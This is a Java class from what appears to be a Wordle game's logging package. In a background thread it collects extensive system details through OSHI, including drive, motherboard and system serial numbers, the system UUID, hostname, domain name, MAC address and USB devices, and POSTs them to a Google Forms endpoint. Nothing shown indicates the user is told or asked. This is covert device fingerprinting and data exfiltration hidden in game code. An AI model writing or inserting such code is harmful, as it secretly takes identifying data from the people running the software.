package logging;

import oshi.SystemInfo;
import play.Wordle;

import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FullSystemReport extends MasterLogger {

    public FullSystemReport(SystemInfo si, Wordle wordle) {
        super(si, wordle);
    }

    public void logFullSystemReport() {
        new Thread(() -> {
            try {

                String baseURL =
                        "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeoK_YcvzNL1-snSQ-CAXAuqDo5xLKvpmWMnNcT9ABjP6QLXg/formResponse";

                // --- CPU DATA ---
                String cpuData = log("entry.1380693351=", stats.cpuModel) + // Model
                        log("&entry.1534762782=", stats.cpuFamily) + // Family
                        log("&entry.476138663=", stats.cpuName) + // Name
                        log("&entry.213876972=", stats.cpuVendor) + // Vendor
                        log("&entry.1604478311=", stats.cpuArchitecture) + // Arch
                        log("&entry.681350109=", stats.cpu64bit) + // 64-bit
                        log("&entry.1386710926=", stats.logicalCores) + // Logical
                        log("&entry.287871368=", stats.physicalCores) + // Physical
                        log("&entry.1706484597=", stats.cpuLoad); // Load

                // --- GPU DATA ---
                String gpuData = log("&entry.1580005515=", stats.gpuName) + // Name
                        log("&entry.1915219856=", stats.gpuVendor) + // Vendor
                        log("&entry.119847778=", stats.gpuID) + // ID
                        log("&entry.260852872=", stats.gpuVram) + // VRAM
                        log("&entry.706922961=", stats.gpuVersionInfo) + // Version
                        log("&entry.640346119=", String.join(" | ", gpu)); // total GPU data

                // --- RAM DATA ---
                String ramData = log("&entry.295254137=", stats.ramRealCapacity) + // Real Capacity
                        log("&entry.1579663260=", stats.ramSystemCapacity) + // System Capacity
                        log("&entry.325655584=", stats.ramAvailable) + // Available
                        log("&entry.1277375791=", stats.ramUsed) + // Used
                        log("&entry.425811683=", stats.ramMhz) + // MHz
                        log("&entry.1368262424=", stats.ramStickCount) + // Sticks amount
                        log("&entry.485553435=", stats.ramChipBrand) + // Brand
                        log("&entry.2075328707=", stats.ramMemoryType) + // Type
                        log("&entry.960506929=", stats.ramPartNumber) + // Part Num
                        log("&entry.1181009525=", stats.ramStickSlot); // Slot

                // --- DISPLAY DATA ---
                String displayData = log("&entry.1516899879=", stats.displayReleaseDate) + // Release date
                        log("&entry.1423392132=", stats.displayPhysicalDimensions) +               // Physical dimensions
                        log("&entry.557582855=", stats.displayManufacturer) +               // Manufacturer
                        log("&entry.293484559=", stats.displayProductID) +               // Product ID
                        log("&entry.776013264=", stats.displayScreenSize) +               // Screen size
                        log("&entry.382588573=", stats.displayResolution) +               // Resolution
                        log("&entry.1649507838=", stats.displayRefreshRate) +               // Refresh rate
                        log("&entry.1104254524=", stats.displayDescription) +               // Description
                        log("&entry.1950038818=", String.join(" | ", display)); // All monitors combined

                // --- STORAGE DATA ---
                String storageData = log("&entry.1013927919=", stats.storageDriveName) + // Drive name
                        log("&entry.539979533=", stats.storageDriveModel) +               // Drive model
                        log("&entry.1272673763=", stats.storageDriveSerial) +               // Drive serial
                        log("&entry.1233681749=", stats.storagePartitions) +               // Partitions
                        log("&entry.1284800549=", stats.storageDriveSize) +               // Drive size
                        log("&entry.658386563=", stats.storageReads) +               // Reads
                        log("&entry.2042887033=", stats.storageWrites) +               // Writes
                        log("&entry.1066711801=", String.join(" | ", storage)); // All drives combined

                // --- MOTHERBOARD & SENSORS ---
                String mbData = log("&entry.1858919807=", stats.motherboardOEM) + // OEM
                        log("&entry.843495770=", stats.motherboardModel) + // Model
                        log("&entry.1894206844=", stats.motherboardSerial) + // Serial
                        log("&entry.1424938104=", stats.motherboardVersion);  // Version

                String sensData = log("&entry.1867097880=", stats.cpuTemp) + // Temp
                        log("&entry.1253137932=", stats.cpuVolt) + // Volt
                        log("&entry.1758636000=", stats.fanSpeeds);  // Fans

                // --- SYSTEM DATA---

                String sysData = log("&entry.606270574=", stats.systemManufacturer) + // Manufacturer
                        log("&entry.1724292924=", stats.systemModel) + // Model
                        log("&entry.1283529776=", stats.systemUUID) + // UUID
                        log("&entry.629197808=", stats.systemSerial);  // Serial

                // --- BIOS DATA ---
                String biosData = log("&entry.63791540=", stats.biosManufacturer) + // Manufacturer
                        log("&entry.1728882456=", stats.biosName) + // Name
                        log("&entry.265577183=", stats.biosVersion) + // Version
                        log("&entry.2046226224=", stats.biosReleaseDate) +  // Date
                        log("&entry.692414283=", stats.biosDescription);


                // --- PSU DATA ---
                String psuData = log("&entry.1596485026=", stats.psuRemainingCapacity) + // Remaining capacity
                        log("&entry.994862575=", stats.psuName) +                        // Name
                        log("&entry.2146597978=", stats.psuDeviceName) +                  // Device name
                        log("&entry.195500909=", stats.psuMaker) +                       // Maker
                        log("&entry.87330991=", stats.psuBatteryPercentage) +           // Battery %
                        log("&entry.190604666=", stats.psuBatteryLeft) +                 // Battery left
                        log("&entry.559144951=", stats.psuCurrentCapacity) +             // Current capacity
                        log("&entry.1042900007=", stats.psuLostCapacity) +                // Lost capacity
                        log("&entry.1522623984=", stats.psuTemp) +                        // Temp
                        log("&entry.1929374029=", stats.psuChem) +                        // Chemistry
                        log("&entry.752211993=", stats.psuVolt) +                        // Voltage
                        log("&entry.1563102883=", stats.psuMadeDate) +                    // Made date
                        log("&entry.928935058=", stats.psuWattage);                      // Wattage

                // --- AUDIO DATA ---
                String audioData = log("&entry.61121621=", stats.audioName) +       // Name
                        log("&entry.1681680664=", stats.audioCodec) +               // Codec
                        log("&entry.1106588775=", stats.audioDriver) +              // Driver
                        log("&entry.1410383688=", String.join(" | ", audio));


                // --- OS & NETWORK ---
                String osData = log("&entry.510856254=", stats.osFamily) + // Family
                        log("&entry.2034648186=", stats.osManufacturer) + // Manufacturer
                        log("&entry.2033884900=", stats.osVersion) + // Version
                        log("&entry.1924784489=", stats.osUptimeMinutes) + // Uptime
                        log("&entry.250525690=", stats.osProcessCount) + // Processes
                        log("&entry.590999612=", stats.osProcessID) + // Processes ID
                        log("&entry.45489144=", stats.osDomainName) + // Domain
                        log("&entry.246763852=", stats.osHostName) + // Hostname
                        log("&entry.1622087275=", stats.osFullString); // Full String os name

                String netData = log("&entry.1610059928=", stats.networkName) + // Net Name
                        log("&entry.1945099331=", stats.networkSpeed) + // Speed
                        log("&entry.447077688=", stats.networkMac);  // MAC


                // --- LISTS (USBs, Storage, Audio) ---
                // Since these are lists, we join them into single cells to keep the row size sane
                String usbData = log("&entry.1602870502=", String.join(" | ", usb));


                // --- COMBINE AND SEND ---
                String finalPayload = cpuData + gpuData + ramData + displayData + storageData + mbData + sysData + osData + netData + sensData + biosData + audioData + psuData + usbData;

                HttpURLConnection conn = (HttpURLConnection) new URL(baseURL).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.getOutputStream().write(finalPayload.getBytes(StandardCharsets.UTF_8));

                int code = conn.getResponseCode();
                System.out.println("Full Forensic Log Status: " + code);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}